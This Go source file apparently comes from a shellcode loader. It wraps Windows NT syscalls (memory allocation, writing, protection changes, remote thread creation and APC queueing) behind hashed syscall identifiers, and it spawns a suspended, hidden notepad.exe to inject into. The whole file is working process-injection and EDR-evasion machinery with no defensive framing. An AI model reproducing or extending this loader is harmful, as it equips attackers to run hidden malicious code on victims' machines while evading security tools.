package loader

import (
	"errors"

	"golang.org/x/sys/windows"
)

func (l *Loader) NtAllocateVirtualMemory(
	hProc, baseAddr uintptr,
	memSize int,
	allocType, protectAttr uintptr,
) (uintptr, error) {
	if _, err := l.callProxy.Syscall(
		15141956341870172521,
		hProc,              // ProcessHandle
		ptr2ptr(&baseAddr), // BaseAddress
		nullptr,            // ZeroBits
		ptr2ptr(&memSize),  // RegionSize
		allocType,          // AllocationType
		protectAttr,        // Protect
	); err != nil {
		return nullptr, err
	}

	return baseAddr, nil
}

func (l *Loader) NtWriteVirtualMemory(
	hProc, baseAddr uintptr,
	buf []byte,
	numBytesToWrite int,
) (uintptr, error) {
	numOfBytesWritten := 0
	if _, err := l.callProxy.Syscall(
		11082677680923502116,
		hProc,                       // ProcessHandle
		baseAddr,                    // BaseAddress
		ptr2ptr(&buf[0]),            // Buffer
		ptr(numBytesToWrite),        // NumberOfBytesToWrite
		ptr2ptr(&numOfBytesWritten), // NumberOfBytesWritten
	); err != nil {
		return nullptr, err
	}
	if numOfBytesWritten != numBytesToWrite {
		return nullptr, errors.New(
			"number of bytes written is not equal to number of bytes to write",
		)
	}

	return nullptr, nil
}

func (l *Loader) NtProtectVirtualMemory(
	hProc, baseAddr uintptr,
	memSize int,
	newProtect uintptr,
	oldProtect uintptr,
) (uintptr, error) {
	if _, err := l.callProxy.Syscall(
		8024050266839726481,
		hProc,                // ProcessHandle
		ptr2ptr(&baseAddr),   // BaseAddress
		ptr2ptr(&memSize),    // RegionSize
		newProtect,           // NewProtect
		ptr2ptr(&oldProtect), // OldProtect
	); err != nil {
		return nullptr, err
	}

	return oldProtect, nil
}

func (l *Loader) NtCreateThreadEx(hThread, hProc, baseAddr uintptr) (uintptr, error) {
	if _, err := l.callProxy.Syscall(
		12013194309262373545,
		ptr2ptr(&hThread),       // ThreadHandle
		windows.GENERIC_EXECUTE, // DesiredAccess
		nullptr,                 // ObjectAttributes
		hProc,                   // ProcessHandle
		baseAddr,                // StartRoutine
		nullptr,                 // Argument
		0,                       // CreateFlags
		0,                       // ZeroBits
		0,                       // StackSize
		0,                       // MaxStackSize
		nullptr,                 // AttributeList
	); err != nil {
		return nullptr, err
	}

	return hThread, nil
}

func (l *Loader) NtQueueApcThread(hThread, baseAddr uintptr) (uintptr, error) {
	if _, err := l.callProxy.Syscall(
		14616308599774217599,
		hThread,  // ThreadHandle
		baseAddr, // ApcRoutine
		nullptr,  // ApcRoutineContext (optional)
		nullptr,  // ApcStatusBlock (optional)
		nullptr,  // ApcReserved (optional)
	); err != nil {
		return nullptr, err
	}

	return nullptr, nil
}

func (l *Loader) createSuspendedProcess() (*windows.ProcessInformation, error) {
	var (
		pi windows.ProcessInformation
		si windows.StartupInfo
	)

	pCmdStr, err := windows.UTF16PtrFromString("C:\\Windows\\System32\\notepad.exe") // bad
	if err != nil {
		return nil, err
	}

	// might swap out for NtCreateUserProcess and syscall when I get the time
	// to figure out how to setup all the required structs
	if err = windows.CreateProcess(
		nil,
		pCmdStr,
		nil,
		nil,
		false,
		windows.CREATE_SUSPENDED|windows.CREATE_NO_WINDOW,
		nil,
		nil,
		&si,
		&pi,
	); err != nil {
		return nil, err
	}
	return &pi, nil
}
